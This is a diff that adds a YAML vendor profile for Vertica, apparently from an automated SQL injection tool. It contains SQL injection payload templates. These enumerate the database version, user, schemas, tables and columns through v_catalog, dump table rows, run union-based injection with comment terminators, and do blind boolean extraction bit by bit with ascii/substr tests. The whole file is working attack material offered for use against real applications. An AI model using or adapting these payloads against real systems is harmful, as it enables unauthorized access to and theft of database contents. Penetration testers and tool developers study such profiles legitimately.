@@ -1,0 +1,150 @@
+vendor: Vertica
+# jdbc:vertica://127.0.0.1:5433/
+# dbadmin password
+
+resource:
+ info: |
+  select
+      '${enclose_value_sql}'
+      || version()
+      || '${enclose_value_sql}'
+      || current_database()
+      || '${enclose_value_sql}'
+      || user
+      || '${trail_sql}'
+
+ schema:
+  database: |
+   select
+       rr
+       ||'${trail_sql}'
+       r
+   from (
+       select distinct
+           '${enclose_value_sql}'
+           || table_schema
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}'
+           rr
+       from v_catalog.tables
+       order by rr
+       ${limit}
+   )x
+
+  table: |
+   select
+       rr
+       ||'${trail_sql}'
+       r
+   from (
+       select distinct
+           '${enclose_value_sql}'
+           || table_name
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}'
+           rr
+       from v_catalog.tables
+       where table_schema = '${database}'
+       order by rr
+       ${limit}
+   )x
+
+  column: |
+   select
+       rr
+       ||'${trail_sql}'
+       r
+   from (
+       select distinct
+           '${enclose_value_sql}'
+           || column_name
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}'
+           rr
+       from v_catalog.columns
+       where columns.table_schema = '${database}'
+       and columns.table_name = '${table}'
+       order by rr
+       ${limit}
+   )x
+
+  row:
+   query: |
+    select
+        rr
+        ||'${trail_sql}'
+        r
+    from (
+        select distinct
+            '${enclose_value_sql}'
+            || (${fields})
+            || '${separator_qte_sql}'
+            || '0'
+            || '${enclose_value_sql}'
+            rr
+        from ${database}.${table}
+        order by rr
+        ${limit}
+    )x
+   fields:
+    field: |
+     trim(
+         coalesce(
+             ${field.value}::varchar,
+             ''
+         )
+     )
+    concat: "|| '%7f' ||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   select
+       /**
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
+        */
+       '${lead}'
+       || nullif(
+           substr(
+               (${injection}),
+               ${window.char},
+               65536
+           ),
+           '${trail_sql}'
+       )
+  limit: limit 1 offset ${limit.value}
+  failsafe: (1337${indice}7330%2b1)::varchar
+  calibrator: repeat(chr(35), 1024)
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - Vertica Analytics
+
+ normal:
+  indices: union select ${indices}
+  capacity: (select '${lead}' || ${indice} || ${calibrator})
+  orderBy: order by 1337
+
+ boolean:
+  test:
+   bit: |
+    /**
+     * true bit return bit, false bit return 0
+     * 8 & 8 = 8, 8 & 4 = 0
+     */
+    0 != (
+        ascii(
+            substr(
+                (${injection}),
+                ${window.char},
+                1
+            )
+        ) %26${bit}
+    )
+  modeAnd: and
+  modeOr: or
+  blind: ${boolean.mode} ${test}
